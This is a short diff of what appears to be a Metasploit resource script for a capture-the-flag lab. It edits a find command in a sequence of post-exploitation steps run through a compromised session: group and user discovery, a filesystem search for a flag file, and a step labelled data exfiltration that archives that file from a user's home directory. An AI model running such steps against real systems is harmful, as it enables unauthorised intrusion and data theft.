@@ -47,7 +47,7 @@ exploit -j
 sessions -i Y -c 'groups'
 ##-m DISCOVERY
 sessions -i Y -c 'whoami'
-sessions -i Y -c 'find / -name 10_of_clubs.wav 2>&1 | grep -v "Permission denied'
+sessions -i Y -c 'find / -name 10_of_clubs.wav'
 #*location of 10_of_clubs.wav
 ##-m DATA EXFIL
 sessions -i Y -c 'tar -czf 10_of_clubs.wav.tar.gz /home/artoo_detoo/music/10_of_clubs.wav'
